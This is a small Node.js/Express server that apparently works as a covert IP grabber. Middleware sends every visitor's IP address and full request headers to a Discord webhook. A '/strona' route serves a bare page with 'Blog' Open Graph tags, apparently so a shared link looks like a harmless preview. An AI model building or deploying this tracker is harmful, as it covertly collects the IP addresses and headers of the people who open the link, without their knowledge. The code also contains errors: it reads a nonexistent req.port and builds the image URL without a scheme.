const express = require("express");
const app = express();
const { EmbedBuilder, WebhookClient } = require("discord.js");
const dotenv = require("dotenv");

dotenv.config();

const PORT = 3000;
const webhookClient = new WebhookClient({
  id: process.env.WEBHOOK_ID,
  token: process.env.WEBHOOK_TOKEN,
});

app.use((req, res, next) => {
  let ip = req.headers["x-forwarded-for"];
  console.log("===================================================");
  console.log(`Request from IP: ${ip}`);
  console.log(JSON.stringify(req.headers));
  webhookClient.send({
    content: `Request from IP: ${ip}`,
    embeds: [
      new EmbedBuilder()
        .setTitle("Request")
        .setDescription(JSON.stringify(req.headers))
        .setColor("#00FF00"),
    ],
  });

  next();
});

app.get("/strona", (req, res) => {
  const localImageUrl = req.hostname + ":" + req.port + "/images/blog.png";
  res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta property="og:image" content="${localImageUrl}">
            <meta property="og:title" content="Blog">
            <meta property="og:description" content="Blog">
        </head>
        </html>
    `);
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
